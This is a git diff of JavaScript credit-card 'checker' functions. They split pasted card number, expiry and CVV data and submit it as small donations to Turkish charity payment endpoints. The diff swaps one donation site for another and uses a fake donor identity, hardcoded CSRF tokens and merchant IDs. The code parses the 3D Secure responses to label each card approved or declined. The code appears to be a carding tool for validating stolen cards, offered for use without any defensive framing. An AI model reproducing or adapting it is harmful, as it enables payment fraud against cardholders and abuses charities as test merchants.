@@ -18,22 +18,26 @@ export async function checker_bb(card_params) {
     //split with multiple separators -> |,.:;/
     const split_card = card_params.split(/[\s|,.:;/]+/);
 
+    //new card with +
+    const new_card = `${split_card[0].substring(0,4)}+${split_card[0].substring(4,8)}+${split_card[0].substring(8,12)}+${split_card[0].substring(12,16)}`;
+
     const cookieJar = new CookieJar();
-    const client = got.extend({ cookieJar });
+    const client = got.extend({
+        cookieJar
+    });
 
     try {
-        const req = await got.post('https://sanalposprov.garanti.com.tr/servlet/gt3dengine', {
+        const req = await got.post('https://www.ihyavakfi.org.tr/bagis/bagis-yap/', {
             headers: {
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-                'Accept-Language': 'pt-BR,pt;q=0.9',
-                'Connection': 'keep-alive',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Host': 'sanalposprov.garanti.com.tr',
-                'Origin': 'https://dmdturkiye.org',
-                'Referer': 'https://dmdturkiye.org/',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36'
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                'accept-language': 'pt-BR,pt;q=0.9',
+                'content-type': 'application/x-www-form-urlencoded',
+                'cookie': 'csrftoken=YHeC75kzINFx5GTEhk19HnyWQ4QdaZpE0e54bAZgi04l4ZOfx0syJIxhSjqfpwR5',
+                'origin': 'https://www.ihyavakfi.org.tr',
+                'referer': 'https://www.ihyavakfi.org.tr/bagis/',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
             },
-            body: `_token=J4VWHiyyj8gggTkWqNPJZXR9E3YZUIu1xnJeIl1C&secure3dsecuritylevel=3D&cardnumber=${split_card[0]}&cardexpiredatemonth=${split_card[1]}&cardexpiredateyear=${split_card[2].substring(2)}&cardcvv2=${split_card[3]}&mode=PROD&apiversion=v0.01&terminalprovuserid=PROVAUT&terminaluserid=385824&terminalmerchantid=1153096&txntype=sales&txnamount=2000&txncurrencycode=949&txninstallmentcount=&orderid=DMD126516&terminalid=10204558&successurl=https%3A%2F%2Fdmdturkiye.org%2Fbagis-sonuc%3Faction%3Dsuccess&errorurl=https%3A%2F%2Fdmdturkiye.org%2Fbagis-sonuc%3Faction%3Dsuccess&customeremailaddress=maosns883%40gmail.com&customeripaddress=138.118.222.137&secure3dhash=0A107BA48988CCDA314534AAB475402D6C79F7D8`,
+            body: `csrfmiddlewaretoken=K0d67TTL9J6j4kApvnD9uug1J6DmZtjWMx4yboysJWv73Dv0L34ywPfmLldoe0Ln&isim=CARLA+LIMA&email=adeoralimao%40gmail.com&telefon=2129818282&mesaj=&number=${new_card}&card_name=CARLA+LIMA&expiry=${split_card[1]}+%2F+${split_card[2].substring(2)}&cvc=${split_card[3]}&tutar=50&bagis_tip=serbest`,
             https: {
                 rejectUnauthorized: false
             },
@@ -47,6 +51,7 @@ export async function checker_bb(card_params) {
         const value_termurl = html('[name="TermUrl"]').attr('value');
 
         if (value_pareq == undefined || value_md == undefined || value_termurl == undefined) {
+            console.log('sem tokens pareq')
             return `<font style="color: red;">#Reprovada ${card_params} ➜ auth 3ds ➜ empty tokens</font>`;
         }
 
@@ -118,22 +123,26 @@ export async function checker_sicredi(card_params) {
     //split with multiple separators -> |,.:;/
     const split_card = card_params.split(/[\s|,.:;/]+/);
 
-    const cookieJar = new CookieJar();
-    const client = got.extend({ cookieJar });
+    //new card with +
+    const new_card = `${split_card[0].substring(0,4)}+${split_card[0].substring(4,8)}+${split_card[0].substring(8,12)}+${split_card[0].substring(12,16)}`;
 
+    const cookieJar = new CookieJar();
+    const client = got.extend({
+        cookieJar
+    });
+    
     try {
-        const req = await got.post('https://sanalposprov.garanti.com.tr/servlet/gt3dengine', {
+        const req = await got.post('https://www.ihyavakfi.org.tr/bagis/bagis-yap/', {
             headers: {
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-                'Accept-Language': 'pt-BR,pt;q=0.9',
-                'Connection': 'keep-alive',
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Host': 'sanalposprov.garanti.com.tr',
-                'Origin': 'https://dmdturkiye.org',
-                'Referer': 'https://dmdturkiye.org/',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36'
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                'accept-language': 'pt-BR,pt;q=0.9',
+                'content-type': 'application/x-www-form-urlencoded',
+                'cookie': 'csrftoken=YHeC75kzINFx5GTEhk19HnyWQ4QdaZpE0e54bAZgi04l4ZOfx0syJIxhSjqfpwR5',
+                'origin': 'https://www.ihyavakfi.org.tr',
+                'referer': 'https://www.ihyavakfi.org.tr/bagis/',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
             },
-            body: `_token=J4VWHiyyj8gggTkWqNPJZXR9E3YZUIu1xnJeIl1C&secure3dsecuritylevel=3D&cardnumber=${split_card[0]}&cardexpiredatemonth=${split_card[1]}&cardexpiredateyear=${split_card[2].substring(2)}&cardcvv2=${split_card[3]}&mode=PROD&apiversion=v0.01&terminalprovuserid=PROVAUT&terminaluserid=385824&terminalmerchantid=1153096&txntype=sales&txnamount=2000&txncurrencycode=949&txninstallmentcount=&orderid=DMD126516&terminalid=10204558&successurl=https%3A%2F%2Fdmdturkiye.org%2Fbagis-sonuc%3Faction%3Dsuccess&errorurl=https%3A%2F%2Fdmdturkiye.org%2Fbagis-sonuc%3Faction%3Dsuccess&customeremailaddress=maosns883%40gmail.com&customeripaddress=138.118.222.137&secure3dhash=0A107BA48988CCDA314534AAB475402D6C79F7D8`,
+            body: `csrfmiddlewaretoken=K0d67TTL9J6j4kApvnD9uug1J6DmZtjWMx4yboysJWv73Dv0L34ywPfmLldoe0Ln&isim=CARLA+LIMA&email=adeoralimao%40gmail.com&telefon=2129818282&mesaj=&number=${new_card}&card_name=CARLA+LIMA&expiry=${split_card[1]}+%2F+${split_card[2].substring(2)}&cvc=${split_card[3]}&tutar=50&bagis_tip=serbest`,
             https: {
                 rejectUnauthorized: false
             },
@@ -142,7 +151,7 @@ export async function checker_sicredi(card_params) {
         });
 
         const html = load(req);
-        const value_url = html('[name="red2ACSv1"]').attr('action');
+        const value_url = html('[name="downloadForm"]').attr('action');
         const value_pareq = html('[name="PaReq"]').attr('value');
         const value_md = html('[name="MD"]').attr('value');
         const value_termurl = html('[name="TermUrl"]').attr('value');
